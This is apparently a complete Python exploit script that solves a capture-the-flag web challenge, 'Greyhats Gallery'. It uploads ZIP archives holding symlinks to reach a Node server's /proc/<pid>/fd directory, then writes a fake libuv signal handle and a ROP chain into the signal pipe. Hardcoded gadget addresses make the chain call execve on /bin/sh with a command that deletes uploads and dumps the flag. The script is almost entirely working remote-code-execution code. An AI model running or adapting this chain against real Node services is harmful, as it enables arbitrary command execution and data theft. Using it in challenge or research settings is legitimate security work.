#!/usr/bin/env python3
import argparse
import base64
import binascii
import http.client
import json
import os
import re
import stat
import struct
import subprocess
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]

# Addresses for the Node 24 Trixie slim binary in the current gallery image.
DEFAULT_READ_PLT = 0x0730AF0
DEFAULT_EXECVE_PLT = 0x0730F90
DEFAULT_EXIT_PLT = 0x07309C0
DEFAULT_POP_RDI_RET = 0x0B7F60D
DEFAULT_POP_RSI_RET = 0x0B53D9E
DEFAULT_POP_RDX_RET = 0x0BE3662
DEFAULT_STAGE_ADDRESS = 0x0681D800

DEFAULT_HANDLE = 0x009CCD20
DEFAULT_SIGNUM = -2058551296
DEFAULT_CONTROLLED_RET_OFFSET = 0x10
DEFAULT_SIGNAL_READ_FD = 14
DEFAULT_SIGNAL_WRITE_FD = 15

DEFAULT_COMMAND = (
    "rm -f /app/uploads/*.jpg; "
    "base64 /flag-*.txt > /app/views/flag.ejs; "
    "node /app/src/server.js"
)
DEFAULT_FLAG_PATH = "/flag"

STAGE2_LEN = 0x200


class ScannerArgs:
    json = False
    limit = 100
    stride = 8
    only_useful = True
    require_utf8_pointer = False
    require_utf8_message = False
    skip_closing = True
    signum_min = None
    signum_max = None
    signal_cb_offset = 0x60
    signum_offset = 0x68
    flags_offset = 0x58
    loop_signal_pipefd_offset = 0x228
    gadget_bytes = 24
    max_mapping_size = 0
    no_signal_pipe = False


def p64(value):
    return struct.pack("<Q", value & 0xffffffffffffffff)


def p32(value):
    return struct.pack("<i", value)


def parse_int(value):
    return int(value, 0)


def choose_candidate(candidates):
    preferred = []
    for candidate in candidates:
        classification = candidate["classification"]
        if classification.get("kind") != "pop-ret":
            continue
        if not classification.get("useful"):
            continue
        if classification.get("hasPopRsp"):
            continue
        if classification.get("controlledRetOffset") not in (0x10, 0x18, 0x20):
            continue
        preferred.append(candidate)

    if not preferred:
        raise RuntimeError("scanner did not find a usable fake-handle first-stage gadget")

    preferred.sort(key=lambda item: (
        item["classification"].get("controlledRetOffset", 0x1000),
        item["classification"].get("popCount", 99),
    ))
    return preferred[0]


def choose_stage_address(exe, maps):
    writable_node = [
        mapping for mapping in maps
        if "r" in mapping.perms
        and "w" in mapping.perms
        and os.path.realpath(mapping.path) == exe
        and mapping.size >= 0x1000
    ]
    if not writable_node:
        raise RuntimeError("could not find a writable Node mapping for stage2")

    mapping = writable_node[-1]
    address = (mapping.end - 0x800) & ~0xf
    if address + STAGE2_LEN > mapping.end:
        raise RuntimeError("chosen stage2 address does not fit in writable Node mapping")
    return address, mapping.label()


def multipart_upload(base_url, zip_path):
    boundary = "----gallery-procfd-boundary"
    data = Path(zip_path).read_bytes()
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"photos\"; filename=\"{Path(zip_path).name}\"\r\n"
        "Content-Type: application/zip\r\n\r\n"
    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()

    req = urllib.request.Request(
        f"{base_url}/upload",
        data=body,
        headers={
            "content-type": f"multipart/form-data; boundary={boundary}",
            "content-length": str(len(body)),
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as res:
            return res.status, res.geturl(), res.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        return error.code, error.geturl(), error.read().decode("utf-8", "replace")
    except http.client.RemoteDisconnected:
        return 0, f"{base_url}/upload", "remote disconnected"


def http_get_text(base_url, path):
    try:
        with urllib.request.urlopen(f"{base_url}{path}", timeout=4) as res:
            return res.status, res.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8", "replace")
    except (urllib.error.URLError, http.client.RemoteDisconnected, ConnectionResetError) as error:
        return 0, str(error)


def http_post_form(base_url, path, fields):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(
        f"{base_url}{path}",
        data=data,
        headers={"content-type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return res.status
    except urllib.error.HTTPError as error:
        return error.code
    except (urllib.error.URLError, http.client.RemoteDisconnected, ConnectionResetError):
        return 0


def upload_symlink_probe(base_url, link_name, target):
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "pidprobe.zip"
        info = zipfile.ZipInfo(link_name)
        info.create_system = 3
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        with zipfile.ZipFile(path, "w") as archive:
            archive.writestr(info, target)
        return multipart_upload(base_url, path)


def discover_procfd_dir(base_url, max_pid):
    """Locate the Node process /proc/<pid>/fd by probing through the gallery.

    The container may run under an init wrapper (e.g. CTFd-Whale's
    docker_enable_init default), in which case PID 1 is a root-owned docker-init
    and the Node process lives at some other, non-deterministic PID. A symlink to
    /proc/<pid>/fd/0 only stats cleanly (HTTP 2xx/3xx after the upload redirect)
    when <pid> is a process whose fd directory the appuser-owned Node can
    traverse, i.e. Node itself. Root-owned (init) or dead PIDs make collectPhotos
    throw EACCES/ENOENT and the upload returns 500, so we skip them. Each probe
    symlink is deleted afterwards so the gallery listing stays healthy for the
    next iteration. Scanning ascending returns the lowest live appuser process,
    which is the long-lived Node server.
    """
    for pid in range(1, max_pid + 1):
        link_name = f"pidprobe-{pid}.jpg"
        status, _url, _body = upload_symlink_probe(base_url, link_name, f"/proc/{pid}/fd/0")
        http_post_form(base_url, "/photos/delete", {"path": link_name})
        if 200 <= status < 400:
            return f"/proc/{pid}/fd", pid
    return None, None


def make_procfd_symlink_zip(directory, link_name, procfd_dir):
    path = Path(directory) / "procfd-link.zip"
    info = zipfile.ZipInfo(link_name)
    info.create_system = 3
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr(info, procfd_dir)
    return path


def make_procfd_write_zip(directory, link_name, fd, payload, name="procfd-write.zip"):
    path = Path(directory) / name
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr(f"{link_name}/{fd}", payload)
    return path


def make_procfd_file_symlink_zip(directory, filename, fd, procfd_dir):
    path = Path(directory) / "target-link.zip"
    info = zipfile.ZipInfo(filename)
    info.create_system = 3
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr(info, f"{procfd_dir.rstrip('/')}/{fd}")
    return path


def install_procfd_symlink(base_url, link_name, procfd_dir):
    with tempfile.TemporaryDirectory() as tmp:
        zip_path = make_procfd_symlink_zip(tmp, link_name, procfd_dir)
        status, url, body = multipart_upload(base_url, zip_path)
    return {"status": status, "url": url, "body": body[:400]}


def upload_named_file(base_url, filename, payload):
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / filename
        path.write_bytes(payload)
        return multipart_upload(base_url, path)


def procfd_write_via_normal_upload(base_url, filename, fd, payload, procfd_dir):
    with tempfile.TemporaryDirectory() as tmp:
        link_zip = make_procfd_file_symlink_zip(tmp, filename, fd, procfd_dir)
        link_status, link_url, link_body = multipart_upload(base_url, link_zip)

    write_status, write_url, write_body = upload_named_file(base_url, filename, payload)
    return {
        "link": {"status": link_status, "url": link_url, "body": link_body[:500]},
        "write": {"status": write_status, "url": write_url, "body": write_body[:800]},
        "ok": write_status == 0 or 200 <= write_status < 400,
    }


def probe_procfd_write(base_url, link_name, procfd_dir):
    del link_name
    return procfd_write_via_normal_upload(
        base_url,
        "probe-fd5.jpg",
        5,
        b"GALLERY_PROC_FD_PROBE\n",
        procfd_dir,
    )


def build_stage2(stage_address, command):
    path = stage_address
    dash_c = stage_address + 0x10
    command_ptr = stage_address + 0x20
    argv = stage_address + 0x100

    command_bytes = command.encode("ascii") + b"\x00"
    if 0x20 + len(command_bytes) >= 0x100:
        raise ValueError("command is too long for the fixed stage2 layout")

    blob = bytearray(STAGE2_LEN)
    blob[0:8] = b"/bin/sh\x00"
    blob[0x10:0x13] = b"-c\x00"
    blob[0x20:0x20 + len(command_bytes)] = command_bytes
    struct.pack_into("<QQQQ", blob, 0x100, path, dash_c, command_ptr, 0)
    return bytes(blob), {
        "path": path,
        "dashC": dash_c,
        "command": command_ptr,
        "argv": argv,
        "commandText": command,
    }


def build_payload(candidate, signal_pipe, stage_address, command, gadgets):
    read_fd = signal_pipe["signalPipeReadFd"]
    write_fd = signal_pipe["signalPipeWriteFd"]
    controlled_ret_offset = candidate["classification"]["controlledRetOffset"]

    stage2, stage2_info = build_stage2(stage_address, command)
    message = p64(candidate["handle"]) + p32(candidate["signum"]) + b"\x00" * 4

    rop = b""
    rop += p64(gadgets["pop_rdi"]) + p64(read_fd)
    rop += p64(gadgets["pop_rsi"]) + p64(stage_address)
    rop += p64(gadgets["pop_rdx"]) + p64(len(stage2))
    rop += p64(gadgets["read"])
    rop += p64(gadgets["pop_rdi"]) + p64(stage2_info["path"])
    rop += p64(gadgets["pop_rsi"]) + p64(stage2_info["argv"])
    rop += p64(gadgets["pop_rdx"]) + p64(0)
    rop += p64(gadgets["execve"])
    rop += p64(gadgets["pop_rdi"]) + p64(0)
    rop += p64(gadgets["exit"])

    first_read = bytearray(512)
    first_read[0:16] = message
    if controlled_ret_offset + len(rop) > len(first_read):
        raise ValueError("ROP chain does not fit in libuv signal stack read")
    first_read[controlled_ret_offset:controlled_ret_offset + len(rop)] = rop

    payload = bytes(first_read) + stage2
    return payload, {
        "targetFd": write_fd,
        "messageHex": message.hex(),
        "controlledRetOffset": controlled_ret_offset,
        "stage2Address": hex(stage_address),
        "stage2Length": len(stage2),
        "stage2": stage2_info,
        "payloadLength": len(payload),
    }


def docker_pid(container):
    output = subprocess.check_output(
        ["docker", "inspect", "-f", "{{.State.Pid}}", container],
        text=True,
    ).strip()
    pid = int(output)
    if pid <= 0:
        raise RuntimeError(f"container {container!r} is not running")
    return pid


def manual_candidate(args):
    return {
        "handle": args.handle,
        "signum": args.signum,
        "signalCb": 0,
        "gadget": ["manual candidate"],
        "classification": {
            "kind": "manual",
            "useful": True,
            "controlledRetOffset": args.controlled_ret_offset,
        },
    }


def print_json(label, value):
    print(f"\n[{label}]")
    print(json.dumps(value, indent=2))


def decode_base64_flag(body):
    candidates = [
        "".join(body.split()),
        *re.findall(r"[A-Za-z0-9+/=]{12,}", body),
    ]
    for candidate in candidates:
        try:
            decoded = base64.b64decode(candidate, validate=True).decode("utf-8").strip()
        except (binascii.Error, UnicodeDecodeError):
            continue
        if decoded:
            return candidate, decoded
    return None, None


def main():
    parser = argparse.ArgumentParser(
        description="Attempt the SonarSource procfd signal-pipe RCE through the Greyhats Gallery ZIP upload primitive."
    )
    parser.add_argument("--url", default="http://127.0.0.1:34267", help="gallery base URL")
    parser.add_argument("--container", default="greyhats_gallery", help="container name used only to discover host PID")
    parser.add_argument("--pid", type=int, help="host PID of the Node process; overrides --container")
    parser.add_argument("--procfd-dir", default=None, help="procfd directory as seen by unzip inside the container; auto-discovered by probing /proc/<pid>/fd when omitted (handles an init-wrapped, non-PID-1 Node process)")
    parser.add_argument("--max-pid", type=int, default=64, help="highest PID to probe when auto-discovering the Node process procfd dir")
    parser.add_argument("--skip-find-pid", action="store_true", help="skip procfd auto-discovery and assume /proc/1/fd (Node is PID 1)")
    parser.add_argument("--link-name", default="procfd", help="symlink name created in /app/uploads")
    parser.add_argument("--read-fd", type=int, help="libuv signal pipe read fd; overrides symbol detection")
    parser.add_argument("--write-fd", type=int, help="libuv signal pipe write fd; overrides symbol detection")
    parser.add_argument("--handle", type=parse_int, default=DEFAULT_HANDLE, help="fake uv_signal_t handle pointer")
    parser.add_argument("--signum", type=int, default=DEFAULT_SIGNUM, help="fake handle signum value")
    parser.add_argument("--controlled-ret-offset", type=parse_int, default=DEFAULT_CONTROLLED_RET_OFFSET)
    parser.add_argument("--stage-address", type=parse_int, default=DEFAULT_STAGE_ADDRESS)
    parser.add_argument("--scan", action="store_true", help="scan /proc for candidate/stage values instead of using gallery-image defaults")
    parser.add_argument("--payload-filename", default="signal.jpg", help="deterministic upload filename used as the procfd symlink")
    parser.add_argument("--command", default=DEFAULT_COMMAND)
    parser.add_argument("--flag-path", default=DEFAULT_FLAG_PATH, help="route used to fetch the written flag.ejs")
    parser.add_argument("--force", action="store_true", help="continue even if the stdout procfd write probe fails")
    parser.add_argument("--skip-probe", action="store_true", help="do not test /proc/1/fd/1 before sending the ROP payload")
    parser.add_argument("--read-plt", type=parse_int, default=DEFAULT_READ_PLT)
    parser.add_argument("--execve-plt", type=parse_int, default=DEFAULT_EXECVE_PLT)
    parser.add_argument("--exit-plt", type=parse_int, default=DEFAULT_EXIT_PLT)
    parser.add_argument("--pop-rdi", type=parse_int, default=DEFAULT_POP_RDI_RET)
    parser.add_argument("--pop-rsi", type=parse_int, default=DEFAULT_POP_RSI_RET)
    parser.add_argument("--pop-rdx", type=parse_int, default=DEFAULT_POP_RDX_RET)
    args = parser.parse_args()

    if args.procfd_dir is None:
        if args.skip_find_pid:
            args.procfd_dir = "/proc/1/fd"
        else:
            found_dir, found_pid = discover_procfd_dir(args.url, args.max_pid)
            if found_dir is None:
                raise SystemExit(
                    "could not locate an accessible /proc/<pid>/fd through the gallery "
                    f"(probed PIDs 1..{args.max_pid}). The Node process may be unreachable; "
                    "pass --procfd-dir explicitly or raise --max-pid."
                )
            print_json("procfd discovery", {"nodePid": found_pid, "procfdDir": found_dir})
            args.procfd_dir = found_dir

    if not args.skip_probe:
        probe = probe_procfd_write(args.url, args.link_name, args.procfd_dir)
        print_json("procfd normal-upload write probe", probe)
        if not probe["ok"] and not args.force:
            raise SystemExit(
                "procfd write primitive is blocked. Use --force to send the ROP payload anyway."
            )
    else:
        print_json("procfd probe", {"skipped": True})

    scanner_args = ScannerArgs()
    exe = "/usr/local/bin/node"
    maps = []
    candidate = manual_candidate(args)
    stage_address = args.stage_address
    stage_mapping = "manual gallery-image default"

    if args.scan:
        from scan import detect_signal_pipe, scan_candidates

        pid = args.pid or docker_pid(args.container)
        try:
            exe, maps, candidates = scan_candidates(pid, scanner_args)
        except PermissionError as error:
            raise SystemExit(
                f"cannot inspect /proc/{pid}; run against a same-UID analysis instance "
                "or provide --handle/--signum/--controlled-ret-offset/--stage-address"
            ) from error
        candidate = choose_candidate(candidates)
        stage_address, stage_mapping = choose_stage_address(exe, maps)

    signal_pipe = None
    read_fd = args.read_fd if args.read_fd is not None else DEFAULT_SIGNAL_READ_FD
    write_fd = args.write_fd if args.write_fd is not None else DEFAULT_SIGNAL_WRITE_FD
    if read_fd is not None and write_fd is not None:
        signal_pipe = {
            "defaultLoopStruct": None,
            "signalPipeReadFd": read_fd,
            "signalPipeWriteFd": write_fd,
            "readFdTarget": None,
            "writeFdTarget": None,
        }
    elif args.scan:
        signal_pipe = detect_signal_pipe(pid, exe, maps, scanner_args.loop_signal_pipefd_offset)

    if not signal_pipe:
        raise SystemExit("could not identify the libuv signal pipe; pass --read-fd and --write-fd")

    gadgets = {
        "read": args.read_plt,
        "execve": args.execve_plt,
        "exit": args.exit_plt,
        "pop_rdi": args.pop_rdi,
        "pop_rsi": args.pop_rsi,
        "pop_rdx": args.pop_rdx,
    }
    payload, payload_info = build_payload(candidate, signal_pipe, stage_address, args.command, gadgets)
    payload_info["exe"] = exe
    payload_info["stage2Mapping"] = stage_mapping
    payload_info["candidate"] = {
        "handle": hex(candidate["handle"]),
        "signalCb": hex(candidate["signalCb"]),
        "signum": candidate["signum"],
        "gadget": candidate["gadget"],
        "classification": candidate["classification"],
    }
    print_json("payload", payload_info)

    upload_result = procfd_write_via_normal_upload(
        args.url,
        args.payload_filename,
        signal_pipe["signalPipeWriteFd"],
        payload,
        args.procfd_dir,
    )
    print_json("payload upload", upload_result)

    deadline = time.time() + 5
    flag_result = {"status": None, "encoded": None, "flag": None}
    while time.time() < deadline:
        status, body = http_get_text(args.url, args.flag_path)
        encoded, decoded = decode_base64_flag(body)
        flag_result = {
            "status": status,
            "encoded": encoded,
            "flag": decoded,
            "body": body[:400] if decoded is None else None,
        }
        if decoded:
            break
        time.sleep(0.2)
    print_json("flag", flag_result)
    if flag_result.get("flag") is None:
        raise SystemExit("failed to fetch and decode the flag from the HTTP service")


if __name__ == "__main__":
    main()
